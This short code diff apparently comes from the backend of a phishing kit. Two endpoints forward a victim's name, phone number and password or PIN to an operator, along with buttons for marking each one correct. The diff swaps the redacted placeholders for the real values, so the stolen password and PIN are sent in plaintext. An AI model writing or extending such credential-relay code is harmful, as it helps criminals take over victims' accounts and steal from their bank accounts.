@@ -123,7 +123,7 @@ app.post('/submit-password', (req, res) => {
 
 👤 Name: ${name}
 📞 Phone: ${phone}
-🔑 Password: [REDACTED]
+🔑 Password: ${password}
 🆔 Ref: ${requestId}`,
     [[
       { text: '✅ Correct Password', callback_data: `pass_ok:${requestId}` },
@@ -160,7 +160,7 @@ app.post('/submit-pin', (req, res) => {
 
 👤 Name: ${name}
 📞 Phone: ${phone}
-🔢 PIN: [REDACTED]
+🔢 PIN: ${pin}
 🆔 Ref: ${requestId}`,
     [[
       { text: '✅ Correct PIN', callback_data: `pin_ok:${requestId}` },
